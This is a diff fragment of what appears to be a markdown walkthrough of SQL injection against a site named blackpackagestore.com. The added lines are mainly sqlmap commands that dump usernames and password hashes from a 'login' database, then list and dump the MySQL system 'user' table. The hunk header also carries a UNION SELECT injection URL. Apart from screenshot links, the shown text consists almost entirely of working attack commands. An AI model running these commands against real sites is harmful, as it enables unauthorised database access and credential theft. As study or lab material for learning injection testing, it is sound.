@@ -70,17 +70,25 @@ https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,user_password
 
 ![image](https://github.com/user-attachments/assets/2127b404-259e-417a-94e4-722aec4c55b3)
 
-`sqlmap -u https://blackpackagestore.com/product.php?id=72 -D login -T users --columns`
+`sqlmap -u https://blackpackagestore.com/product.php?id=72 -D login -T users -C user_name --dump`
 
 ![image](https://github.com/user-attachments/assets/d9f17e4d-25ef-4890-ac4a-bf44a344b327)
 
+sqlmap -u https://blackpackagestore.com/product.php?id=72 -D login -T users -C user_password_hash --dump`
+
 ![image](https://github.com/user-attachments/assets/fe22e570-f0ce-463b-a7e3-ea2bc8165b7f)
 
+`sqlmap -u https://blackpackagestore.com/product.php?id=72 -D mysql --tables`
+
 ![image](https://github.com/user-attachments/assets/52a6f9ab-eb0d-4a26-9dcb-f3b508b81e3b)
+
+`sqlmap -u https://blackpackagestore.com/product.php?id=72 -D mysql -T user --columns`
 
 ![image](https://github.com/user-attachments/assets/2054d2a2-1b16-4880-a56e-c776fda75c70)
 
 ![image](https://github.com/user-attachments/assets/0709a901-ee5c-47ef-95ad-a21e66f6de02)
+
+`sqlmap -u https://blackpackagestore.com/product.php?id=72 -D mysql -T user -C Host,User,plugin --dump`
 
 ![image](https://github.com/user-attachments/assets/394ed735-6352-49a4-b918-61cc6fab1593)
 
